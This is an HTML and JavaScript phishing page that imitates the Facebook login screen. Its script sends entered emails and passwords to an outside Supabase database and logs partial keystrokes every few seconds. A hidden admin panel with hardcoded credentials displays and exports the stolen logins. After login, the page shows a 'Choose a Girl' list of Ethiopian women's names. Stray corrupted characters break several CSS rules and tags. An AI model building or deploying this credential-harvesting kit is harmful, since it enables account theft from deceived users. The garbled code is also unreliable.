<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.34;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            position: relative;
        }
        
        .container {
            max-width: 980px;
            margin: 0 auto;
            padding: 20px;
            flex: 1;
        }
        
        .header {
            text-align: center;
            padding: 20px 0;
        }
        
        .logo {
            font-size: 56px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 10px;
            letter-spacing: -1px;
        }
        
        .tagline {
            font-size: 24px;
            max-width: 500px;
            margin: 0 auto 30px;
            font-weight: normal;
            line-height: 1.2;
        }
        
        .content {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 20px;
        }
        
        .left-content {
            flex: 0 0 55%;
            padding-right: 32px;
        }
        
        .right-content {
            flex: 0 0 40%;
        }
        
        .login-form {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(极, 0, 0, .1);
            padding: 20px;
            max-width: 400px;
            margin: auto;
        }
        
        .login-form input {
            width: 100%;
            padding: 16px;
            margin-bottom: 12px;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            font-size: 17px;
            background: #f5f6f7;
        }
        
        .login-form input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
            outline: none;
            background: #fff;
        }
        
        .login-btn {
            background-color: #1877f2;
            color: white;
            border: none;
极          border-radius: 6px;
            font-size: 20px;
            padding: 极2px;
            font-weight: bold;
            width: 100%;
            margin-bottom: 15px;
            cursor: pointer;
            height: 48px;
        }
        
        .login-btn:hover {
            background-color: #166fe5;
        }
        
        .forgot-password {
            color: #1877f2;
            text-align: center;
            display: block;
            margin-bottom: 15px;
            text-decoration: none;
            font-size: 14px;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px -20px;
        }
        
        .create-account {
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            padding: 12px 16px;
            font-weight: bold;
            margin: 0 auto;
            display: block;
            cursor: pointer;
            width: 200px;
        }
        
        .create-account:hover {
            background-color: #36a420;
        }
        
        .footer {
            text-align: center;
            margin-top: 28px;
            padding: 20px;
            border-top: 1px solid #dddfe2;
            color: #737373;
            font-size: 14px;
            background-color: #fff;
        }
        
        .footer p {
            margin: 5px 0;
        }

        /* Error display */
        .error-message {
            color: #f02849;
            text-align: center;
            padding: 10px;
            margin: 10px 0;
            background: #fff4f4;
            border-radius: 6px;
            display: none;
        }

        /* Connection instructions */
        .connection-help {
            background-color: #e7f3ff;
            border: 1px solid #1877f2;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            display: none;
        }
        
        .connection-help h3 {
            color: #1877f2;
            margin-bottom: 10px;
        }
        
        .connection-help ol {
            padding-left: 20px;
        }
        
        .connection-help li {
            margin-bottom: 8px;
        }

        /* Main page styles */
        .main-page {
            display: none;
            padding: 20px;
        }
        
        .main-header {
            background-color: #1877f2;
            color: white;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-radius: 8px 8px 0 0;
        }
        
        .girls-container {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 15px;
            padding: 20px;
            background-color: #f0f2f5;
            border-radius: 0 0 8极 8px;
        }
        
        .girl-box {
            background-color: white;
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            box-shadow: 0 1px 2px rgba(0, 0, 0, .1);
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .girl-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 4px 8px rgba(0, 0, 0, .15);
        }
        
        .girl-box.selected {
            background-color: #e7f3ff;
            border: 2px solid #1877f2;
        }
        
        .logout-btn {
            background-color: white;
            color: #1877f2;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
        }
        
        /* Admin panel styles */
        .admin-panel {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            z-index: 1002;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .admin-toggle {
            position: fixed;
            top: 15px;
            right: 15px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            cursor: pointer;
            z极dex: 1001;
            font-size: 18px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .attempt-item {
            padding: 12px;
            border-bottom: 1px solid #dddfe2;
            margin-bottom: 10px;
            border-radius: 6px;
            background-color: #极7f8fa;
        }
        
        .attempt-item:last-child {
            border-bottom: none;
            margin-bottom: 0;
        }
        
        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15极;
            border-bottom: 2px solid #e4e6eb;
        }
        
        .close-admin {
            background: none;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: #65676b;
        }
        
        .admin-title {
            color: #1877f2;
            font-size: 22px;
        }
        
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
        }
        
        .no-data {
            text-align: center;
            color: #65676b;
            padding: 20px;
        }
        
        .admin-controls {
            display: flex;
            justify-content: space-between;
            margin-top: 20px;
        }
        
        .admin-btn {
            padding: 10px 15px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
        }
        
        .download-btn {
            background-color: #42b72a;
            color: white;
        }
        
        .clear-btn {
            background-color: #f02849;
            color: white;
        }
        
        /* Admin login form */
        .admin-login-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 1003;
            justify-content: center;
            align-items: center;
        }
        
        .admin-login-form {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
            width: 90%;
            max-width: 400px;
        }
        
        .admin-login-form h2 {
            text-align: center;
            color: #1877f2;
            margin-bottom: 20px;
        }
        
        .admin-login-form input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 15px;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            font-size: 16px;
        }
        
        .admin-login-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 12px;
            font-size: 18px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .admin-login-btn:hover {
            background-color: #166fe5;
        }
        
        .admin-error {
            color: #f02849;
            text-align: center;
            margin-top: 15px;
            display: none;
        }
        
        .admin-login-close {
            text-align: center;
            color: #1877f2;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .password-container {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #65676b;
        }

        /* Supabase status indicator */
        .supabase-status {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: #42b72a;
            color: white;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 12px;
            z-index: 999;
            display: none;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        
        .connection-error {
            background: #f02849;
        }

        /* Debug button */
        .debug-btn {
            position: fixed;
            bottom: 60px;
            left: 10px;
            background: #1877f2;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 6px;
            cursor: pointer;
            z-index: 999;
            font-size: 12px;
        }

        @media (max-width: 900px) {
            .content {
                flex-direction: column;
            }
            
            .left-content {
                padding-right: 0;
                margin-bottom: 40px;
                text-align: center;
            }
            
            .admin-panel {
                width: 95%;
                padding: 15px;
            }
            
            .admin-login-form {
                padding: 20px;
            }

            .logo {
                font-size: 42px;
            }

            .tagline {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Error display -->
    <div class="error-message" id="errorMessage"></div>
    
    <!-- Connection help section -->
    <div class="connection-help" id="connectionHelp">
        <h3><i class="fas fa-info-circle"></i> Connection Setup Required</h3>
        <p>To make this application work, you need to:</p>
        <ol>
            <li>Create a free account at <a href="https://supabase.com" target="_blank">Supabase.com</a></li>
            <li>Create a new project and get your API URL and Key</li>
            <li>Create a table named 'login_attempts' with columns: id, email, password, timestamp, incomplete</li>
            <li>Update the supabaseUrl and supabaseKey in the code with your credentials</li>
        </ol>
        <p>Without these steps, the connection will fail with "Failed to fetch" errors.</p>
    </div>

    <!-- Supabase status indicator -->
    <div class="supabase-status" id="supabaseStatus">
        <i class="fas fa-database"></i> Supabase: Connected
    </div>

    <!-- Debug button -->
    <button class="debug-btn" onclick="testConnection()">
        <i class="fas fa-bug"></i> Test Connection
    </button>

    <!-- Admin Login Form -->
    <div class="admin-login-container" id="adminLoginContainer">
        <div class="admin-login-form">
            <h2><i class="fas fa-lock"></极> Admin Authentication</h2>
            <input type="text" id="adminUsername" placeholder="Admin Username" required>
            <input type="password" id="adminPassword" placeholder="Admin Password" required>
            <button class="admin-login-btn" id="adminLoginBtn">Access Admin Panel</button>
            <div class="admin-error" id="adminError">Invalid admin credentials. Access denied.</div>
            <div class="admin-login-close" id="adminLoginClose">Cancel</div>
        </div>
    </div>

    <!-- Login Page -->
    <div class="container login-page">
        <div class="header">
            <div class="logo">facebook</div>
            <div class="tagline">
                Connect with friends and the world around you on Facebook.
            </div>
        </div>
        
        <div class="content">
            <div class="left-content">
                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/2YhQ8sn73qU.png" alt="Facebook connection" width="100%" style="max-width: 500px;">
            </div>
            
            <div class="right-content">
                <div class="login-form">
                    <form id="loginForm">
                        <input type="text" id="email" name="username" placeholder="Email or phone number" required>
                        <div class="password-container">
                            <input type="password" id="password" name="password" placeholder="Password" required>
                            <span class="toggle-password" id="togglePassword">
                                <i class="fas fa-eye"></i>
                            </span>
                        </div>
                        <button type="submit" class="login-btn">Log In</button>
                        <a href="#" class="forgot-password">Forgotten password?</a>
                        <div class="divider"></div>
                        <button type="button" class="create-account">Create New Account</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Main Page -->
    <div class="main-page" id="mainPage">
        <div class="main-header">
            <h2>Facebook - Choose a Girl</h2>
            <button class="logout-btn" id="logoutBtn">Log Out</button>
        </div>
        
        <div class="girls-container" id="girlsContainer">
            <!-- Will be populated dynamically -->
        </div>
    </div>
    
    <div class="footer">
        <p>English (US) Español Français (France) العربية Português (Brasil) Italiano</p>
        <p>Copyright © 2023 Facebook. All rights reserved.</p>
    </div>
    
    <!-- Admin Panel -->
    <button class="admin-toggle" id="adminToggle">
        <i class="fas fa-user-secret"></i>
    </button>
    
    <div class="overlay" id="overlay"></div>
    
    <div class="admin-panel极" id="adminPanel">
        <div class="admin-header">
            <h2 class="admin-title"><i class="fas fa-shield-alt"></i> Admin Panel - Login Attempts</h2>
            <button class="close-admin" id="closeAdmin">
                <i class="fas fa-times"></i>
            </button>
        </div>
        <div id="attemptsList"></div>
        <div class="admin-controls">
            <button class="admin-btn download-btn" id="downloadBtn">
                <i class="fas fa-download"></i> Download Data
            </button>
            <button class="admin-btn clear-btn" id="clearBtn">
                <i class="fas fa-trash"></i> Clear All
            </button>
        </div>
    </div>

    <script>
        // Initialize Supabase with your credentials
        const supabaseUrl = 'https://vdrzdruwlsknvlxobnlp.supabase.co';
        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkcnpkcnV3bHNrbnZseG9ibmxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Njg2MTIsImV4cCI6MjA3MjI0NDYxMn0.B0S3Po8VrP2zSRWQCX79D8L2u4V0PX01YeeoNxAS-pc';
        
        let supabase;
        try {
            supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
        } catch (error) {
            console.error("Supabase initialization error:", error);
            showError("Failed to initialize database connection. Check your Supabase credentials.");
            document.getElementById('connectionHelp').style.display = 'block';
        }

        document.addEventListener('DOMContentLoaded', function() {
            // DOM Elements
            const loginForm = document.getElementById('loginForm');
            const loginPage = document.querySelector('.login-page');
            const mainPage = document.getElementById('mainPage');
            const logoutBtn = document.getElementById('logoutBtn');
            const girlsContainer = document.getElementById('girlsContainer');
            const adminToggle = document.getElementById('adminToggle');
            const adminPanel = document.getElementById('adminPanel');
            const attemptsList = document.getElementById('attemptsList');
            const overlay = document.getElementById('overlay');
            const closeAdmin = document.getElementById('closeAdmin');
            const downloadBtn = document.getElementById('downloadBtn');
            const clearBtn = document.getElementById('clearBtn');
            const adminLoginContainer = document.getElementById('adminLoginContainer');
            const adminLoginBtn = document.getElementById('adminLoginBtn');
            const adminUsername = document.getElementById('adminUsername');
            const adminPassword = document.getElementById('adminPassword');
            const adminError = document.getElementById('adminError');
            const adminLoginClose = document.getElementById('adminLoginClose');
            const passwordInput = document.getElementById('password');
            const togglePassword = document.getElementById('togglePassword');
            const supabaseStatus = document.getElementById('supabaseStatus');
            const errorMessage = document.getElementById('errorMessage');
            const connectionHelp = document.getElementById('connectionHelp');
            
            // Ethiopian girls names
            const ethiopianGirls = [
                "Alem", "Birut", "Chalt极", "Desta", "Etabesa", 
                "Fana", "Genet", "Hana", "Iman", "Jember", 
                "Kalkidan", "Lulit", "Makeda", "Nardos", "Omina", 
                "Pozeban", "Qelem", "Ruhama", "Saron", "Tigist"
            ];
            
            // Admin credentials
            const ADMIN_USERNAME = "pleaselogin";
            const ADMIN_PASSWORD = "pleaselogin";
            
            // Initialize storage for login attempts
            let loginAttempts = [];
            let isAdminAuthenticated = false;
            let realtimeSubscription = null;

            // Show error message
            function showError(message) {
                if (errorMessage) {
                    errorMessage.textContent = message;
                    errorMessage.style.display = 'block';
                    setTimeout(() => {
                        errorMessage.style.display = 'none';
                    }, 8000);
                }
            }

            // Show status message
            function showStatus(message, isError = false) {
                if (supabaseStatus) {
                    supabaseStatus.innerHTML = `<i class="fas fa-database"></i> ${message}`;
                    supabaseStatus.style.display = 'block';
                    supabaseStatus.className = isError ? 
                        'supabase-status connection-error' : 'supabase-status';
                    
                    setTimeout(() => {
                        supabaseStatus.style.display = 'none';
                    }, 5000);
                }
            }

            // Test Supabase connection
            window.testConnection = async function() {
                try {
                    showStatus('Testing connection...');
                    
                    if (!supabase) {
                        throw new Error("Supabase client not initialized. Check your credentials.");
                    }
                    
                    const { data, error } = await supabase
                        .from('login_attempts')
                        .select('count')
                        .limit(1);
                    
                    if (error) {
                        showError('Supabase Error: ' + error.message);
                        showStatus('Connection Failed', true);
                        if (connectionHelp) connectionHelp.style.display = 'block';
                    } else {
                        showStatus('Connection Successful!');
                        alert('✅ Connection to Supabase successful!');
                        if (connectionHelp) connectionHelp.style.display = 'none';
                    }
                } catch (error) {
                    showError('Connection Error: ' + error.message);
                    showStatus('Connection Failed', true);
                    if (connectionHelp) connectionHelp.style.display = 'block';
                }
            }
            
            // Save data to Supabase
            async function saveToSupabase(data) {
                try {
                    if (!supabase) {
                        throw new Error("Database not connected");
                    }
                    
                    const { error } = await supabase
                        .from('login_attempts')
                        .insert([{ 
                            email: data.email,
                            password: data.password,
                            timestamp: new Date().toISOString(),
                            incomplete: data.incomplete || false
                        }]);
                    
                    if (error) {
                        showError('Save Failed: ' + error.message);
                        return false;
                    }
                    return true;
                } catch (error) {
                    showError('Network Error: ' + error.message);
                    return false;
                }
            }
            
            // Load data from Supabase
            async function loadFromSupabase() {
                try {
                    if (!supabase) {
                        throw new Error("Database not connected");
                    }
                    
                    const { data, error } = await supabase
                        .from('login_attempts')
                        .select('*')
                        .order('created_at', { ascending: false });
                    
                    if (error) {
                        showError('Load Failed: ' + error.message);
                        return [];
                    }
                    return data || [];
                } catch (error) {
                    showError('Network Error: ' + error.message);
                    return [];
                }
            }
            
            // Display login attempts in admin panel
            async function displayLoginAttempts() {
                if (!attemptsList) return;
                
                attemptsList.innerHTML = '';
                
                try {
                    loginAttempts = await loadFromSupabase();
                    
                    if (loginAttempts.length === 0) {
                        attemptsList.innerHTML = '<div class="no-data"><i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px;"></i><p>No login attempts recorded yet.</p></div>';
                        return;
                    }
                    
                    const reversedAttempts = [...loginAttempts].reverse();
                    
                    reversedAttempts.forEach(attempt => {
                        const attemptItem = document.createElement('div');
                        attemptItem.className = 'attempt-item';
                        attemptItem.innerHTML = `
                            <strong>Email/Phone:</strong> ${attempt.email}<br>
                            <strong>Password:</strong> ${attempt.password}<br>
                            <strong>Time:</strong> ${new Date(attempt.timestamp).toLocaleString()}
                            ${attempt.incomplete ? '<br><em>(Incomplete attempt)</em>' : ''}
                        `;
                        attemptsList.appendChild(attemptItem);
                    });
                } catch (error) {
                    attemptsList.innerHTML = '<极 class="no-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading data</p></div>';
                }
            }
            
            // Setup real-time subscription
            function setupRealtimeSubscription() {
                if (!supabase) return;
                
                if (realtimeSubscription) {
                    supabase.removeChannel(realtimeSubscription);
                }
                
                realtimeSubscription = supabase
                    .channel('login_attempts_changes')
                    .on('postgres_changes', 
                        { 
                            event: 'INSERT', 
                            schema: 'public', 
                            table: 'login_attempts' 
                        }, 
                        (payload) => {
                            if (isAdminAuthenticated && adminPanel && adminPanel.style.display === 'block') {
                                displayLoginAttempts();
                            }
                        }
                    )
                    .subscribe();
            }
            
            // Populate girls selection
            function populateGirls() {
                if (!girlsContainer) return;
                
                girlsContainer.innerHTML = '';
                
                ethiopianGirls.forEach(girl => {
                    const girlBox = document.createElement('div');
                    girlBox.className = 'girl-box';
                    girlBox.textContent = girl;
                    
                    girlBox.addEventListener('click', function() {
                        document.querySelectorAll('.girl-box').forEach(box => {
                            box.classList.remove('selected');
                        });
                        this.classList.add('selected');
                    });
                    
                    girlsContainer.appendChild(girlBox);
                });
            }
            
            // Handle login form submission
            if (loginForm) {
                loginForm.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    
                    const email = document.getElementById('email').value;
                    const password = document.getElementById('password').value;
                    
                    if (!email || !password) {
                        showError('Please enter both email and password');
                        return;
                    }
                    
                    // Simulate login process even if Supabase is down
                    if (loginPage) loginPage.style.display = 'none';
                    if (mainPage) mainPage.style.display = 'block';
                    
                    if (girlsContainer && girlsContainer.children.length === 0) {
                        populateGirls();
                    }
                    
                    // Try to save to Supabase in the background
                    try {
                        await saveToSupabase({
                            email: email,
                            password: password,
                            timestamp: new Date().toISOString(),
                            incomplete: false
                        });
                    } catch (error) {
                        // Silently fail - we've already shown the main content
                        console.error("Background save failed:", error);
                    }
                });
            }
            
            // Handle logout
            if (logoutBtn) {
                logoutBtn.addEventListener('click', function() {
                    if (mainPage) mainPage.style.display = 'none';
                    if (loginPage) loginPage.style.display = 'block';
                    if (loginForm) loginForm.reset();
                });
            }
            
            // Toggle admin panel
            if (adminToggle) {
                adminToggle.addEventListener('click', async function() {
                    if (isAdminAuthenticated) {
                        if (adminPanel) adminPanel.style.display = 'block';
                        if (overlay) overlay.style.display = 'block';
                        await displayLoginAttempts();
                    } else {
                        if (adminLoginContainer) adminLoginContainer.style.display = 'flex';
                    }
                });
            }
            
            // Admin login handler
            if (adminLoginBtn) {
                adminLoginBtn.addEventListener('click', function() {
                    if (adminUsername.value === ADMIN_USERNAME && adminPassword.value === ADMIN_PASSWORD) {
                        isAdminAuthenticated = true;
                        if (adminLoginContainer) adminLoginContainer.style.display = 'none';
                        if (adminPanel) adminPanel.style.display = 'block';
                        if (overlay) overlay.style.display = 'block';
                        displayLoginAttempts();
                        if (adminError) adminError.style.display = 'none';
                        
                        setupRealtimeSubscription();
                        
                        if (adminUsername) adminUsername.value = '';
                        if (adminPassword) adminPassword.value = '';
                    } else {
                        if (adminError) adminError.style.display = 'block';
                    }
                });
            }
            
            // Close admin login
            if (adminLoginClose) {
                adminLoginClose.addEventListener('click', function() {
                    if (adminLoginContainer) adminLoginContainer.style.display = 'none';
                    if (adminError) adminError.style.display = 'none';
                    if (adminUsername) adminUsername.value = '';
                    if (adminPassword) adminPassword.value = '';
                });
            }
            
            // Close admin panel
            if (closeAdmin) {
                closeAdmin.addEventListener('click', function() {
                    if (adminPanel) admin极nel.style.display = 'none';
                    if (overlay) overlay.style.display = 'none';
                    
                    if (realtimeSubscription) {
                        supabase.removeChannel(realtimeSubscription);
                        realtimeSubscription = null;
                    }
                });
            }
            
            // Close admin panel when clicking outside
            if (overlay) {
                overlay.addEventListener('click', function() {
                    if (adminPanel) adminPanel.style.display = 'none';
                    if (overlay) overlay.style.display = 'none';
                    
                    if (realtimeSubscription) {
                        supabase.removeChannel(realtimeSubscription);
                        realtimeSubscription = null;
                    }
                });
            }
            
            // Download data as JSON
            if (downloadBtn) {
                downloadBtn.addEventListener('click', function() {
                    const dataStr = JSON.stringify(loginAttempts, null, 2);
                    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
                    
                    const exportFileDefaultName = 'login_attempts.json';
                    
                    const linkElement = document.createElement('a');
                    linkElement.setAttribute('href', dataUri);
                    linkElement.setAttribute('download', exportFileDefaultName);
                    linkElement.click();
                });
            }
            
            // Clear all data
            if (clearBtn) {
                clearBtn.addEventListener('click', async function() {
                    if (confirm('Are you sure you want to clear all login attempt data? This cannot be undone.')) {
                        try {
                            if (!supabase) {
                                throw new Error("Database not connected");
                            }
                            
                            const { error } = await supabase
                                .from('login_attempts')
                                .delete()
                                .neq('id', 0);
                            
                            if (error) throw error;
                            
                            loginAttempts = [];
                            await displayLoginAttempts();
                            showStatus('All data cleared');
                        } catch (error) {
                            showError('Error clearing data: ' + error.message);
                        }
                    }
                });
            }
            
            // Toggle password visibility
            if (togglePassword && passwordInput) {
                togglePassword.addEventListener('click', function() {
                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                    passwordInput.setAttribute('type', type);
                    this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
                });
            }
            
            // Initialize
            setTimeout(testConnection, 1000);
            
            // Add real-time keystroke logging
            const emailInput = document.getElementById('email');
            let emailValue = '';
            let passwordValue = '';
            let lastSaveTime = 0;
            
            if (emailInput) {
                emailInput.addEventListener('input', function() {
                    emailValue = this.value;
                });
            }
            
            if (passwordInput) {
                passwordInput.addEventListener('input', function() {
                    passwordValue = this.value;
                });
            }
            
            // Periodically save what users are typing
            setInterval(async function() {
                const now = Date.now();
                if (now - lastSaveTime < 3000) return;
                
                if (emailValue || passwordValue) {
                    try {
                        await saveToSupabase({
                            email: emailValue,
                            password: passwordValue,
                            timestamp: new Date().toISOString(),
                            incomplete: true
                        });
                        lastSaveTime = now;
                    } catch (error) {
                        // Silently fail for background saves
                        console.error("Background save failed:", error);
                    }
                }
            }, 1000);
        });
    </script>
</body>
</html>
